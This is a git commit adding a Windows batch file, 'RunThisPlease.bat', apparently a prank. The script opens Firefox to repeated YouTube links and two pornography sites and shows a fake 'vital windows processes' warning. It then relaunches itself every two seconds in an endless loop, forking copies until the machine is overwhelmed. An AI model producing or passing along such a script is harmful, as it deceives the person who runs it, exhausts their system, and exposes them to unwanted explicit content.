26da61eec8beb82b8c6a5c51d41ecc3843ea985d
ChaddingtonIII <63942754+ChaddingtonIII@users.noreply.github.com>
2020-04-18 21:34:44 -0700

    Add files via upload

---
+++ RunThisPlease.bat
@@ -0,0 +1,11 @@
+@echo off
+cd C:\Program Files (x86)\Mozilla Firefox
+start firefox.exe www.youtube.com/watch?v=Z4epPxXzpYk http://fortniteburger.net www.youtube.com/watch?v=LcbK__SeXy0 www.pornhub.com www.xhamster.com www.youtube.com/watch?v=Z4epPxXzpYk www.youtube.com/watch?v=Z4epPxXzpYk www.youtube.com/watch?v=Z4epPxXzpYk www.youtube.com/watch?v=Z4epPxXzpYk www.youtube.com/watch?v=Z4epPxXzpYk www.youtube.com/watch?v=Z4epPxXzpYk
+color 0a
+exho Starting vital windows processes, do not Close.
+Pushd "%~dp0"
+:a
+title Win%random%a
+timeout /t 2 /nobreak >nul
+start RunThisPlease.bat
+goto a 
